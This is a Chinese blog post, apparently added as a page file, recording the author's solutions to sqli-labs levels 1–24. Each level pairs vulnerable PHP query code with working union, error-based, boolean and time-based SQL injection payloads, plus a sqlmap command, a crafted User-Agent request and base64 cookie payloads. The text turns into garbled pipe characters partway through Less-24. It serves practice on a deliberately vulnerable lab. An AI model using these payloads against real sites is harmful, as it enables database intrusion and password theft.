@@ -1,0 +1,917 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="stylesheet" href="//cdn.bootcss.com/highlight.js/9.2.0/styles/github.min.css">
+<script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script>
+</head>
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.js"></script>
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
+<!-- 雪花特效 -->
+<script type="text/javascript" src="\js\snow.js"></script>
+<!--动态线条背景-->
+<script>window.onload = function () {
+            hljs.initHighlighting();
+        }</script>
+
+
+  <body>
+  
+<head>
+  <meta charset="utf-8">
+  <meta name="author" content="董沅鑫, yuanxin.me@gmail.com" />
+  
+  
+  
+  <title>sqli-labs | iluem&#39;Blog</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="Hexo, theme-bmw" />
+  
+
+  <script>
+    console.log('\n%c Hexo-theme-bmw v4.0 ' + '%c 🎉 https://github.com/dongyuanxin/theme-bmw 🎉\n' + '\n%c View demo online ' + '%c 🔍 https://godbmw.com/ 🔍  \n' , 'color: #fadfa3; background: #030307; padding:3px 0;', '', 'color: #fadfa3; background: #030307; padding:3px 0;', '');
+  </script>
+
+  
+
+  
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/icon/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+  
+<script src="/js/util.js"></script>
+<script src="/js/valine.min.js"></script>
+
+
+  
+
+  
+    <link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet">
+    <script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js" async></script>
+  
+
+  
+  
+  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" async></script>
+  
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.0/dist/av-min.js"></script>
+  
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+    
+
+    <div id="app">
+
+      <div class="header-wrap">
+  <header>
+    <div class="site-brand">
+      <div class="site-title">
+        <a href="/">iluem.xyz</a>
+      </div>
+    </div>
+    <nav class="site-navigation">
+      <ul class="nav-menu">
+      
+        <li class="nav-item" data-path="/">
+          
+            <a 
+              href="/"
+              target="_self"
+            >
+              主页
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          
+            <a 
+              href="/archives/"
+              target="_self"
+            >
+              归档
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          
+            <a 
+              href="/categories/"
+              target="_self"
+            >
+              分类
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          
+            <a 
+              href="/tags/"
+              target="_self"
+            >
+              标签
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          
+            <a 
+              href="/friends/"
+              target="_self"
+            >
+              友链
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          
+            <a 
+              href="/about/"
+              target="_self"
+            >
+              关于
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="">
+          
+            <a href="javascript:void(0);" v-else>链接</a>
+            <ul class="nav-menu--dropdown">
+              
+                <li>
+                  <a 
+                    href="https://github.com/qhaoduoyu" 
+                    target="_blank"
+                  >
+                    Github
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+      
+      </ul>
+    </nav>
+    <i class="iconfont icon-menu"></i>
+  </header>
+</div>
+
+<script>
+  let links = document.querySelectorAll('.nav-item');
+  for(let link of links){
+    let childrenLink = link.querySelector('ul');
+    link.addEventListener('mouseenter', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown active";
+      }
+    })
+    link.addEventListener('mouseleave', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown";
+      }
+    })
+  }
+  let rootRealPath = getRealPath(window.location.pathname, true);
+  for(let link of links) {
+    let linkPath = link.getAttribute("data-path");
+    if(linkPath && getRealPath(linkPath, true) === rootRealPath) {
+      link.className = "nav-item hover";
+    }
+  }
+
+  let iconMenu = document.querySelector("i.iconfont.icon-menu"),
+    iconMenuClicked = false;
+  let navDOM = document.querySelector("nav.site-navigation");
+  iconMenu.addEventListener("click", () => {
+    iconMenuClicked 
+      ? navDOM.className = "site-navigation active"
+      : navDOM.className = "site-navigation";
+    iconMenuClicked = !iconMenuClicked;
+  })
+</script>
+
+      
+
+
+
+
+
+
+
+
+<div class="container post-index">
+
+  
+
+<div class="post">
+  <h1 class="article-title">
+    <span>sqli-labs</span>
+  </h1>
+  <div class="article-top-meta">
+    <span>
+      发布 : 
+      2020-07-30
+    </span>
+    
+    
+      <span>
+        浏览 : <span class="article-timer" data-identity="passagessqli-labs"></span>
+      </span>
+    
+  </div>
+
+  
+
+  <div class="article-content">
+    <div class="markdown-body">
+      <h1 id="Sqli-labs学习记录"><a href="#Sqli-labs学习记录" class="headerlink" title="Sqli-labs学习记录"></a>Sqli-labs学习记录</h1><p><a href="https://a2u13.com/2020/03/06/Mysql%E7%9A%84getshell%E4%B8%8E%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">参考链接</a></p>
+<h2 id="Basic-Challenges（1-20）"><a href="#Basic-Challenges（1-20）" class="headerlink" title="Basic Challenges（1~20）"></a>Basic Challenges（1~20）</h2><h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><p><code>id=&#39;$id&#39;</code></p>
+<h4 id="源码逻辑"><a href="#源码逻辑" class="headerlink" title="源码逻辑"></a><strong>源码逻辑</strong></h4><pre><code class="php">#查询语句
+$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;
+#查询到结果
+if(true)
+    print(result);
+else
+    print(error);</code></pre>
+<h4 id="注入方式"><a href="#注入方式" class="headerlink" title="注入方式"></a><strong>注入方式</strong></h4><p>联合</p>
+<pre><code>?id=0&#39; union select 1,3,(select group_concat(&#39; id:&#39;,id,&#39; username:&#39;,username,&#39; password:&#39;,password) from users)%23</code></pre><p>报错</p>
+<pre><code>?id=0%27or updatexml(1,concat(0x7e,(select concat(id,&#39; &#39;,username,&#39; &#39;,password) from users limit 0,1)),1)%23</code></pre><p>bool</p>
+<pre><code>?id=0&#39; or ord(substr(database(),1,1))&gt;114%23     //true
+?id=0&#39; or ord(substr(database(),1,1))&gt;115%23     //false    </code></pre><p>延时(用or会很慢，跟行数有关)</p>
+<pre><code>?id=1&#39;and if(ord(substr(database(),1,1))&lt;115,1,sleep(3))%23</code></pre><p><strong>sqlmap</strong></p>
+<pre><code>python sqlmap.py -u &quot;http://sqli.iluem.xyz/Less-1/?id=1&quot; -p id --dbms=mysql --random-agent -v 3  --auth-type=Basic --auth-cred=user:pass  --current-db --technique=U(U、E、B、T)</code></pre><h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><p><code>id=$id</code></p>
+<p>几乎同Less-1，数字型，不赘述。</p>
+<pre><code>?id=-2 union select 1,(select group_concat(username,&#39;~&#39;,password,&#39;~&#39;)from users),2; -- -</code></pre><h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><p><code>id=(&#39;$id&#39;)</code></p>
+<pre><code>?id=-2&#39;) union select 1,(select group_concat(username,&#39;~&#39;,password,&#39;~&#39;)from users),2-- -</code></pre><h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><p><code>id=(&quot;$id&quot;)</code></p>
+<pre><code>http://2612018eu6.51vip.biz/sqli-labs/Less-4/?id=-2&quot;) union all select 1,2,(select database())-- -</code></pre><h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><p><code>id=&#39;$id&#39;</code></p>
+<p>与前边不同的是没有回显了</p>
+<pre><code class="php">if(true)
+    {
+      echo &#39;You are in...........&#39;;
+      }
+    else 
+    {
+    print_r(mysql_error());
+    }</code></pre>
+<p>所以联合注入不能用了</p>
+<p>剩下的还有报错、bool、延时，同1一样。</p>
+<h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h3><p><code>id=&quot;$id&quot;</code></p>
+<p>与5利用方式一样</p>
+<h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h3><p><code>id=((&#39;$id&#39;))</code></p>
+<pre><code class="php">if($row)
+    {
+      echo &#39;You are in.... Use outfile......&#39;;
+      }
+    else 
+    {
+    echo &#39;You have an error in your SQL syntax&#39;;
+    //print_r(mysql_error());
+    }</code></pre>
+<p>由于这儿注释了<code>mysql_error()</code>不显示错误,因此只能用延时和布尔注入。</p>
+<pre><code>?id=1&#39;)) and if(ord(substr(database(),1,1))&gt;115,1,sleep(3))%23</code></pre><h3 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h3><p><code>id=&#39;$id&#39;</code></p>
+<p>同7，延时或者布尔</p>
+<h3 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h3><p><code>id=&#39;$id&#39;</code></p>
+<pre><code class="php">if($row)
+    {
+      echo &#39;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#39;;    
+      echo &#39;You are in...........&#39;;
+      echo &quot;&lt;br&gt;&quot;;
+        echo &quot;&lt;/font&gt;&quot;;
+      }
+    else 
+    {
+
+echo &#39;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#39;;
+echo &#39;You are in...........&#39;;
+//print_r(mysql_error());
+//echo &quot;You have an error in your SQL syntax&quot;;
+echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;    
+echo &#39;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#39;;    
+
+}</code></pre>
+<p>无论对错回显都一样，只能用延时。同8</p>
+<pre><code>?id=1&#39; and if(ord(substr(database(),1,1))&gt;115,1,sleep(3))%23</code></pre><h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><p><code>id=&quot;$id&quot;</code></p>
+<p>同9</p>
+<pre><code>?id=1&quot; and if(ord(substr(database(),1,1))&gt;115,1,sleep(3))%23</code></pre><hr>
+<h3 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h3><pre><code class="php">$uname=$_POST[&#39;uname&#39;];
+$passwd=$_POST[&#39;passwd&#39;];
+@$sql=&quot;SELECT username, password FROM users WHERE username=&#39;$uname&#39; and password=&#39;$passwd&#39; LIMIT 0,1&quot;;</code></pre>
+<p>可以联合注入、报错注入、bool注入、延时注入。</p>
+<pre><code class="php">#联合注入
+uname=-1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_schema=database()%23&amp;passwd=123
+#报错注入
+uname=-1&#39; or extractvalue(0x0a,concat(0x0a,(select database())))%23&amp;passwd=123
+#bool
+uname=-1&#39;or ord(substr(database(),1,1))&gt;114%23 &amp;passwd=123 //true
+uname=-1&#39;or ord(substr(database(),1,1))&gt;115%23 &amp;passwd=123 //false
+#延时注入
+uname=admin&#39; and if(ord(substr(database(),1,1))&lt;115,1,sleep(3))%23 &amp;passwd=123
+#还是这个问题，如果用or前边不为真的话感觉会遍历整个表每一行，导致sleep执行了太多次。所以用一个表里有的admin吧</code></pre>
+<h3 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h3><pre><code class="php">    $uname=&#39;&quot;&#39;.$uname.&#39;&quot;&#39;;
+    $passwd=&#39;&quot;&#39;.$passwd.&#39;&quot;&#39;; 
+    @$sql=&quot;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&quot;;</code></pre>
+<pre><code>uname=1&quot;) or 1=1 %23&amp;passwd=123</code></pre><p>可以使用的方法同11</p>
+<h3 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h3><pre><code class="php">@$sql=&quot;SELECT username, password FROM users WHERE username=(&#39;$uname&#39;) and password=(&#39;$passwd&#39;) LIMIT 0,1&quot;;
+
+#uname=admin&#39;) and if(ord(substr(database(),1,1))&lt;115,1,sleep(3))%23 &amp;passwd=123</code></pre>
+<p>不回显信息但登录成功与否的页面不同</p>
+<p>因此不能使用联合注入了，方法同11</p>
+<h3 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h3><p>只是和13闭合方式不同,其他同13</p>
+<pre><code class="php">$uname=&#39;&quot;&#39;.$uname.&#39;&quot;&#39;;
+    $passwd=&#39;&quot;&#39;.$passwd.&#39;&quot;&#39;; 
+    @$sql=&quot;SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1&quot;;
+#uname=admin&quot;and if(ord(substr(database(),1,1))&lt;115,1,sleep(3))%23&amp;passwd=123</code></pre>
+<h3 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h3><p>注释了报错信息，因此只能使用bool和延时注入了，闭合方式和14不同，其他同14</p>
+<pre><code>uname=1&#39;or 1=1%23&amp;passwd=123
+uname=1&#39;or 2=1%23&amp;passwd=123</code></pre><h3 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h3><p>多试几遍可以使用</p>
+<pre><code>uname=1&quot;)or 1=1%23&amp;passwd=123</code></pre><p>源码</p>
+<pre><code class="php">$uname=&#39;&quot;&#39;.$uname.&#39;&quot;&#39;;
+    $passwd=&#39;&quot;&#39;.$passwd.&#39;&quot;&#39;; 
+    @$sql=&quot;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&quot;;</code></pre>
+<p>同15，只是闭合方式换了，可以使用延时或者bool</p>
+<h3 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h3><p>这一关开始检查输入了</p>
+<pre><code class="php">function check_input($value)
+    {
+    if(!empty($value))
+        {
+        // truncation (see comments)
+        $value = substr($value,0,15);
+        }
+
+        // Stripslashes if magic quotes enabled
+        if (get_magic_quotes_gpc())
+            {
+            $value = stripslashes($value);
+            }
+
+        // Quote if not a number
+        if (!ctype_digit($value))
+            {
+            $value = &quot;&#39;&quot; . mysql_real_escape_string($value) . &quot;&#39;&quot;;
+            }
+
+    else
+        {
+        $value = intval($value);
+        }
+    return $value;
+    }
+
+$uname=check_input($_POST[&#39;uname&#39;]);  
+
+$passwd=$_POST[&#39;passwd&#39;];
+
+@$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;;
+if(true)
+    $update=&quot;UPDATE users SET password = &#39;$passwd&#39; WHERE username=&#39;$row1&#39;&quot;;
+    echo &quot; You password has been successfully updated &quot; ;    
+    if (mysql_error())
+        {
+            print_r(mysql_error());
+        }
+        else
+        {
+            echo &quot; You password has been successfully updated &quot; ;        
+        }
+else
+       echo &quot;Bug off you Silly Dumb hacker&quot;;</code></pre>
+<p>但是这一关检查uname，select语句中用到了uname，所以不能利用，利用的点实在只要uname为真就执行的update语句</p>
+<p>因为update执行错误会报错，因此我们可以构造如下payload</p>
+<pre><code>uname=admin&amp;passwd=1&#39; and (select updatexml(1,concat(0x7e,(select database())),1))%23</code></pre><p>当然还可以使用延时</p>
+<pre><code>#延时注入
+passwd=-1&#39;and if(ord(substr(database(),1,1))&lt;115,1,sleep(0.1))%23%23 &amp;uname=admin</code></pre><p>感觉无论passwd是真或者假，页面都会回显成功，因此不能使用bool</p>
+<h3 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h3><p>知识点</p>
+<ul>
+<li><code>$_SERVER[&#39;HTTP_CLIENT_IP&#39;]</code> 客户端可以伪造。</li>
+<li><code>$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]</code>，客户端可以伪造。</li>
+<li><code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code>，客户端不能伪造。</li>
+</ul>
+<p>此题目使用最后一个获取ip，故不能伪造。</p>
+<p>源码大致逻辑</p>
+<pre><code class="php">$uagent = $_SERVER[&#39;HTTP_USER_AGENT&#39;];
+$IP = $_SERVER[&#39;REMOTE_ADDR&#39;];
+$uname = check_input($_POST[&#39;uname&#39;]);
+$passwd = check_input($_POST[&#39;passwd&#39;]);
+$sql=&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;
+if(true)
+    echo &#39;Your IP ADDRESS is: &#39; .$IP;
+    $insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)&quot;;
+    echo &#39;Your User Agent is: &#39; .$uagent;
+    print_r(mysql_error());            
+else
+    print_r(mysql_error());            
+    echo &quot;Try again looser&quot;;</code></pre>
+<p>这一关uname和passwd都被过滤了，因此只能通过insert这儿注入，因为，ip是不可控的，所以只能通过uagent。</p>
+<p>最终请求体如下</p>
+<pre><code>POST /sqli-labs/Less-18/ HTTP/1.1
+Host: 2612018eu6.51vip.biz
+Content-Length: 20
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: &#39;or updatexml(1,concat(0x7e,(select database())),1),123,123)-- -
+Origin: http://2612018eu6.51vip.biz
+Content-Type: application/x-www-form-urlencoded
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://2612018eu6.51vip.biz/sqli-labs/Less-17/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,fi;q=0.8
+Connection: close
+
+passwd=admin&amp;uname=admin</code></pre><p>payload如下</p>
+<pre><code>&#39;or updatexml(1,concat(0x7e,(select database())),1),123,123)-- -</code></pre><p>因为开启了报错，所以可以简单点使用报错注入，同时还可以使用的有延时</p>
+<pre><code>&#39;or if(ord(substr(database(),1,1))&gt;114,1,sleep(2)),123,123)-- -
+&#39;or if(ord(substr(database(),1,1))&gt;115,1,sleep(2)),123,123)-- -</code></pre><h3 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h3><p>源码大致如下</p>
+<pre><code class="php">$uagent = $_SERVER[&#39;HTTP_REFERER&#39;];
+$IP = $_SERVER[&#39;REMOTE_ADDR&#39;];
+$uname = check_input($_POST[&#39;uname&#39;]);
+$passwd = check_input($_POST[&#39;passwd&#39;]);
+$sql=&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;
+if(true)
+    $insert=&quot;INSERT INTO `security`.`referers` (`referer`,         `ip_address`) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;)&quot;;
+    print_r(mysql_error());        
+else
+    print_r(mysql_error());    </code></pre>
+<p>跟18题几乎一致，不过注入点变为referer了</p>
+<pre><code>&#39; or updatexml(1,concat(0x7e,(select database())),1),123)-- -</code></pre><p>当然也可以延时盲注</p>
+<pre><code>&#39;or if(ord(substr(database(),1,1))&gt;115,1,sleep(2)),123)-- -</code></pre><h3 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h3><pre><code class="php">if(cookie里没有uname)
+    if(isset($_POST[&#39;uname&#39;]) &amp;&amp; isset($_POST[&#39;passwd&#39;]))
+        $uname = check_input($_POST[&#39;uname&#39;]);
+        $passwd = check_input($_POST[&#39;passwd&#39;]);
+        $sql=&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;
+        ···
+else
+    if(!isset($_POST[&#39;submit&#39;]))
+        $cookee = $_COOKIE[&#39;uname&#39;];
+        $sql=&quot;SELECT * FROM users WHERE username=&#39;$cookee&#39; LIMIT 0,1&quot;;
+        if(查询结果为空)
+            die(&#39;Issue with your mysql: &#39; . mysql_error());
+        else
+            echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];            
+            echo &#39;Your Password:&#39; .$row[&#39;password&#39;];    
+            echo &#39;Your ID:&#39; .$row[&#39;id&#39;];
+        ···</code></pre>
+<p>代码很长但逻辑很简单，uname和passwd还是不能注入。但是cookie里设置uname则很好注入。跟Less-1一样。都行</p>
+<p>联合注入</p>
+<pre><code>uname=&#39; union select 1,3,(select group_concat(&#39; id:&#39;,id,&#39; username:&#39;,username,&#39; password:&#39;,password) from users)-- -</code></pre><p>报错注入</p>
+<pre><code>uname=&#39; or updatexml(1,concat(0x7e,(select database())),1)-- -</code></pre><p>时间盲注</p>
+<pre><code>uname=&#39;or if(ord(substr(database(),1,1))&lt;115,1,sleep(0.2))%23</code></pre><p>布尔盲注</p>
+<pre><code>uname=&#39; or ord(substr(database(),1,1))&gt;114%23  
+uname=&#39; or ord(substr(database(),1,1))&gt;115%23</code></pre><hr>
+<h2 id="Advanced-Injections-21-38"><a href="#Advanced-Injections-21-38" class="headerlink" title="Advanced Injections (21~38)"></a>Advanced Injections (21~38)</h2><h3 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h3><p>从源码看与20几乎一致，唯一不同如下</p>
+<pre><code class="php">$cookee = $_COOKIE[&#39;uname&#39;];
+$cookee = base64_decode($cookee);
+            $sql=&quot;SELECT * FROM users WHERE username=(&#39;$cookee&#39;) LIMIT 0,1&quot;;</code></pre>
+<p>因此编码一下就可以</p>
+<p>联合注入</p>
+<pre><code>uname=JykgdW5pb24gc2VsZWN0IDEsMiwoc2VsZWN0IGdyb3VwX2NvbmNhdCgnIGlkOicsaWQsJyB1c2VybmFtZTonLHVzZXJuYW1lLCcgcGFzc3dvcmQ6JyxwYXNzd29yZCkgZnJvbSB1c2VycyktLSAt</code></pre><p>报错注入</p>
+<pre><code>uname=Jykgb3IgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBkYXRhYmFzZSgpKSksMSktLSAt</code></pre><p>布尔注入</p>
+<pre><code>uname=Jykgb3Igb3JkKHN1YnN0cihkYXRhYmFzZSgpLDEsMSkpPjExNC0tIC0=
+uname=Jykgb3Igb3JkKHN1YnN0cihkYXRhYmFzZSgpLDEsMSkpPjExNS0tIC0=</code></pre><p>延时注入</p>
+<pre><code>uname=JylvciBpZihvcmQoc3Vic3RyKGRhdGFiYXNlKCksMSwxKSk8MTE1LDEsc2xlZXAoMC4yKSkj</code></pre><h3 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h3><p>与21不同点如下</p>
+<pre><code class="php">$cookee = $_COOKIE[&#39;uname&#39;];
+$cookee = base64_decode($cookee);
+$cookee1 = &#39;&quot;&#39;. $cookee. &#39;&quot;&#39;;
+$sql=&quot;SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1&quot;;</code></pre>
+<p>其实几乎还是一样,只是拼接不同</p>
+<pre><code>uname=&quot;union select 1,3,(select group_concat(&#39; id:&#39;,id,&#39; username:&#39;,username,&#39; password:&#39;,password) from users)-- -
+#base64之后
+uname=uname=InVuaW9uIHNlbGVjdCAxLDMsKHNlbGVjdCBncm91cF9jb25jYXQoJyBpZDonLGlkLCcgdXNlcm5hbWU6Jyx1c2VybmFtZSwnIHBhc3N3b3JkOicscGFzc3dvcmQpIGZyb20gdXNlcnMpLS0gLQ==</code></pre><p>其他还是一样就跳过</p>
+<h3 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h3><p>题目终于大变样了</p>
+<pre><code class="php">if(isset($_GET[&#39;id&#39;]))
+{
+$id=$_GET[&#39;id&#39;];
+$reg = &quot;/#/&quot;;
+$reg1 = &quot;/--/&quot;;
+$replace = &quot;&quot;;
+$id = preg_replace($reg, $replace, $id);
+$id = preg_replace($reg1, $replace, $id);
+}
+$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;
+if(true)
+    echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];
+      echo &#39;Your Password:&#39; .$row[&#39;password&#39;];
+else
+    print_r(mysql_error());</code></pre>
+<p>因为过滤了注释符，所以闭合就好啦</p>
+<p>想Less-1一样，都可以用</p>
+<p>联合</p>
+<pre><code>?id=&#39; union select 1,(select group_concat(&#39; id:&#39;,id,&#39; username:&#39;,username,&#39; password:&#39;,password) from users), &#39;</code></pre><p>报错</p>
+<pre><code>?id=0%27or updatexml(1,concat(0x7e,(select concat(id,&#39; &#39;,username,&#39; &#39;,password) from users limit 0,1)),1) or &#39;</code></pre><p>bool</p>
+<pre><code>?id=0&#39; or ord(substr(database(),1,1))&gt;114 or &#39;   //true
+?id=0&#39; or ord(substr(database(),1,1))&gt;115 or &#39;     //false    </code></pre><p>延时(用or会很慢，跟行数有关)</p>
+<pre><code>?id=1&#39;and if(ord(substr(database(),1,1))&lt;115,1,sleep(3)) and &#39;1</code></pre><h3 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h3><p>这是一个很经典的二次注入，分析一下源码</p>
+<ul>
+<li>index.php</li>
+</ul>
+<p><img src="https://i.loli.net/2020/08/04/nsZEkIuFOPv2cLH.png" alt="image-20200804100801251"></p>
+<p>主页面主要记录表单信息，但是用户的输入会被过滤所以不存在敏感操作。</p>
+<p>除了正常登录还有以下两个功能</p>
+<ul>
+<li><code>忘记密码</code>：点击忘记密码会提示如果你忘记密码，Go ||||hack|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||</li>
+</ul>
+<p>|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| E|||JM||||||||||||||SF|KL||||||||||||W||||||R”|||||||||||||||||||||||||||||I|||||||||||||||||||||</p>
+
+    </div>
+  </div>
+  
+  
+  
+
+  
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+      <span>
+        
+      </span>
+    </div>
+    <div class="article-meta pull-right">
+    </div>
+  </div>
+</div>
+
+
+  <aside id="sidebar">
+    <p id="sidebar-header"></p>
+    <ol id="sidebar-toc"></ol>
+  </aside>
+  <script async>setTimeout(generateToc, 10);</script>
+
+
+  <nav class="post-navigation">
+    
+      <div class="nav-pre">
+        <i class="iconfont icon-prev"></i>
+        上一篇:
+        <a href="/passagesCTF/" target="_self">CyBRICS CTF 2020 Writeup</a>
+      </div>
+    
+    
+      <div class="nav-next">
+        下一篇:
+        <a href="/passagesBUUCTF/" target="_self">BUUCTF WriteUp</a>
+        <i class="iconfont icon-next"></i>
+      </div>
+    
+  </nav>
+
+  
+    <a href="#comment" class="comment-anchor"></a>
+<div class="comment-title"><i class="iconfont icon-footprint"></i> 留下足迹 <i class="iconfont icon-footprint"></i></div>
+<div id="vcomments"></div>
+
+<script defer>
+  if( true ) {
+    let path = getRealPath()
+    new Valine({
+      el: "#vcomments",
+      appId: "0uSharGIGNO1brdWwOsU0Tf7-gzGzoHsz",
+      appKey: "sivgWCRfGcA6BX905S8dIz1E",
+      notify: false,
+      verify: false,
+      avatar: "robohash",
+      placeholder: "正确填写邮箱, 才能及时收到回复哦♪(^∇^*)",
+      path
+    });
+  }
+</script>
+   
+
+  
+    <script defer>
+const valineAPI = (() => {
+  try {
+    AV.init("0uSharGIGNO1brdWwOsU0Tf7-gzGzoHsz", "sivgWCRfGcA6BX905S8dIz1E");
+  } catch(error) {}
+  const isExist = (identity) => {
+    identity = identity || getRealPath();
+    let query = new AV.Query('Timer');
+    return new Promise((resolve, reject) => {
+      query.equalTo("identity", identity);
+      query.find().then(results => {
+        resolve(results.length > 0);
+      }, error => reject(error));
+    })
+  }
+
+  const _get = (identity) => {
+    let query = null;
+    if(identity && identity instanceof Array){
+      let querys = [];
+      for(let i = 0; i < identity.length; ++i) {
+        querys[i] = new AV.Query('Timer');
+        querys[i].equalTo('identity', identity[i]);
+      }
+      query = AV.Query.or.apply(null ,querys);
+    } else {
+      identity = identity || getRealPath();
+      query = new AV.Query("Timer");
+      query.equalTo("identity", identity);
+    }
+
+    return new Promise((resolve, reject) => {
+      query.find()
+      .then(results => resolve(results))
+      .catch(error => reject(error))
+    })
+  }
+
+  const create = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let Todo = AV.Object.extend('Timer');
+      let todo = new Todo();
+      todo.set("times", 1);
+      todo.set("identity", identity);
+      todo.save().then(res => resolve(true), error => reject(error));
+    })
+  }
+
+  const update = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let query = new AV.Query('Timer');
+      query.equalTo("identity", identity);
+      query.find().then(todos => {
+        todos.forEach(todo => {
+          todo.set("times", todo.attributes.times + 1);
+        });
+        return AV.Object.saveAll(todos);
+      }).then(todos => resolve(true), error => reject(error));
+    })
+  }
+
+  return {
+    isExist,
+    _get,
+    update,
+    create
+  }
+})()
+
+const calcAndWriteTimes = () => {
+  let isPost = true;
+
+  let timerAllDOM = document.querySelectorAll(".article-timer");
+
+  if(isPost) {
+    let identity = timerAllDOM[0].getAttribute("data-identity");
+    valineAPI.isExist(identity)
+    .then(exist => {
+      if(exist) {
+        return valineAPI.update(identity);
+      }
+      return new Promise(resolve => resolve(true));
+    })
+    .then( succuess => valineAPI._get(identity))
+    .then( result => timerAllDOM[0].innerText = result[0].attributes.times)
+    .catch(error => console.log(error.message))
+    return ;
+  }
+
+  let timerDOMCache = {};
+
